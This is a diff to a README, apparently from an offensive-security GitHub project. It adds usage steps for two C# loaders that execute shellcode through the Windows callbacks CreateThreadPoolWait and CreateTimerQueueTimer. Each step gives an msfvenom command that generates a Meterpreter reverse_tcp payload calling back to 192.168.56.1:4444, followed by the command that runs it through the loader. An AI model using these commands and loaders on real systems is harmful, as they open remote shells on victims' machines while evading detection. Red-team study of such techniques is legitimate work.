@@ -18,6 +18,9 @@ C# Codes: "New C# codes for Callback Functions will publish here soon..."
     7. NativePayload_EnumPageFilesW.cs
     8. NativePayload_EnumPropsExW.cs
     9. NativePayload_EnumerateLoadedModules.cs
+    10. NativePayload_CreateThreadPoolWait.cs
+    11. NativePayload_CreateTimerQueueTimer.cs
+
 --------------------------------------------
 
 1. NativePayload_ImageGetDigestStream.cs (Callback Functions Technique via ImageGetDigestStream Native API)
@@ -117,5 +120,27 @@ C# Codes: "New C# codes for Callback Functions will publish here soon..."
     example: NativePayload_EnumerateLoadedModules.exe "fc,48,00,87,00,...."
 
    ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumerateModulesLoaded_W64.png)
+
+ --------------------------------------------   
+  10. NativePayload_CreateThreadPoolWait.cs (Callback Functions Technique via CreateThreadPoolWait Native API)
+ 
+ usage: 
+    
+    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
+    step2: [win] NativePayload_CreateThreadPoolWait.exe  [payload...]
+    example: NativePayload_CreateThreadPoolWait.exe "fc,48,00,87,00,...."
+
+   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_CreateThreadPoolWait.png)
+
+ --------------------------------------------   
+  11. NativePayload_CreateTimerQueueTimer.cs (Callback Functions Technique via CreateTimerQueueTimer Native API)
+ 
+ usage: 
+    
+    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
+    step2: [win] NativePayload_CreateTimerQueueTimer.exe  [payload...]
+    example: NativePayload_CreateTimerQueueTimer.exe "fc,48,00,87,00,...."
+
+   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_CreateTimerQueueTimer.png)
 
  --------------------------------------------   
